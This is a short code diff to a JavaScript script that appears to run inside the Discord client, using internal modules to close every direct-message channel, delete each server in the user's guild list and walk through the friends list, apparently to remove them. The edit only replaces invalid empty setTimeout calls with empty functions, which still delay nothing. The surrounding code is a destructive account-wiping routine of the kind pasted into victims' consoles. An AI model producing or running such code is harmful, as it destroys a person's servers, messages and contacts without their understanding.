@@ -11,7 +11,8 @@ var dms = findModule("getPrivateChannels").getPrivateChannels()
 for(var k in dms){
 findModule("closePrivateChannel").closePrivateChannel(k)
 }
-setTimeout((), 2000)
+setTimeout(function() {
+}, 2000);
 var guilds = findModule("getGuilds").getGuilds()
 var i = 0
 for(var k in guilds){
@@ -21,7 +22,8 @@ var guilds = findModule("getGuilds").getGuilds()
 for(var k in guilds){
 findModule("deleteGuild").deleteGuild(k)
 }
-setTimeout((), 2000)
+setTimeout(function() {
+}, 2000);
 var friends = findModule("getRelationships").getRelationships()
 
 for(var k in friends){
